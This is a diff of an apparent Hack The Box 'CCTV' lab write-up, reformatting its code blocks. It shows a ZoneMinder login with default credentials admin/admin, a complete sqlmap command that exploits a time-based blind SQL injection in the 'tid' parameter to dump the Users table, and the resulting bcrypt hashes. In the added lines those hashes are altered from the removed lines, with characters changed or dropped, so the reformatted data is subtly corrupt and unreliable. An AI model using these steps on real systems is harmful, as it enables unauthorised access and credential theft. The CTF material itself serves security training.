@@ -103,7 +103,8 @@ This page revealed a **ZoneMinder login portal**, specifically **ZoneMinder v1.3
 
 Recognizing that many default installations of ZoneMinder ship with **default administrative credentials**, I attempted to authenticate using the widely known defaults:
 ```
-Username: admin Password: admin
+Username: admin
+Password: admin
 ```
 [![owned cctv from hack the box](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9AWbAxYY5pMsmbJvgMHyyPUqbNR8h7xv6vtfCueMpBd3vS2VO52d5UcLIjS4h1OYA6-F3cXA4T-mTgf6YO4xfl5SGdu5OMb6PP8FCOILaWHaCKyEPRrbH2jDf_UY49eSyZ5W_80KIMtmDFN7prs-d7KZFrIupSTggCoK5evcT3GaApzzugrq1_Shb5cDd/s16000/bandicam%202026-03-09%2013-53-41-963.jpg "owned cctv from hack the box")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9AWbAxYY5pMsmbJvgMHyyPUqbNR8h7xv6vtfCueMpBd3vS2VO52d5UcLIjS4h1OYA6-F3cXA4T-mTgf6YO4xfl5SGdu5OMb6PP8FCOILaWHaCKyEPRrbH2jDf_UY49eSyZ5W_80KIMtmDFN7prs-d7KZFrIupSTggCoK5evcT3GaApzzugrq1_Shb5cDd/s1833/bandicam%202026-03-09%2013-53-41-963.jpg)
 
@@ -164,7 +165,7 @@ After confirming the **time-based blind SQL injection** in the `tid` parameter, 
 
 I executed the following command to extract user credentials from the ZoneMinder database:
 ```
-sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\ -D zm -T Users -C Username,Password --dump --batch \\ --dbms=MySQL --technique=T \\ --cookie="ZMSESSID=jinco4bhig0up657ul2h5u4rjk" \\ --time-sec=2
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm -T Users -C Username,Password --dump --batch --dbms=MySQL --technique=T --cookie="ZMSESSID=jinco4bhig0up657ul2h5u4rjk" --time-sec=2
 ```
 [![CCTV htb easy linux cctv.htb write up walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHt5wpF9sUp48FEYLKrr7ZAaLjdJppgg8H64bdQcIwndaZp7gc4ZeLX5x-2vjGa9RKa7844olZe0m6QCyGfM9aHCTant859QTQnPyHJjpMmYB9C1hwO5bR3yJpPMq7PwqHpblV5qErV7c2VWErB1NN53K2waSkCawaFy_SZ1eND9DE8xkRckt6O1ZS3jZc/s16000/bandicam%202026-03-09%2014-07-55-789.jpg "CCTV htb easy linux cctv.htb write up walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHt5wpF9sUp48FEYLKrr7ZAaLjdJppgg8H64bdQcIwndaZp7gc4ZeLX5x-2vjGa9RKa7844olZe0m6QCyGfM9aHCTant859QTQnPyHJjpMmYB9C1hwO5bR3yJpPMq7PwqHpblV5qErV7c2VWErB1NN53K2waSkCawaFy_SZ1eND9DE8xkRckt6O1ZS3jZc/s1833/bandicam%202026-03-09%2014-07-55-789.jpg)
 
@@ -180,7 +181,13 @@ Because the attack relied on time-based inference, data extraction occurred slow
 
 After completing the extraction process, sqlmap dumped the contents of the **`zm.Users`** table and revealed three user accounts along with their associated password hashes:
 ```
-+------------+--------------------------------------------------------------+ | Username | Password | +------------+--------------------------------------------------------------+ | superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm | | mark | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. | | admin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m | +------------+--------------------------------------------------------------+
++-----------+------------------------------------------------------------------+
+| Username | Password |
++-----------+------------------------------------------------------------------+
+| superadmin| $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhluWM0jrtbm |
+| mark | $2y$10$prZGnazejKcuTv5bKNexX0gLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+| admin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1UignrIckdXrzJmJgkTiAvRUM6m |
++-----------+------------------------------------------------------------------+
 ```
 The password values were stored as **bcrypt hashes**, indicating that ZoneMinder uses a secure password hashing scheme. These hashes would need to be **cracked offline** in order to recover the original plaintext passwords.
 
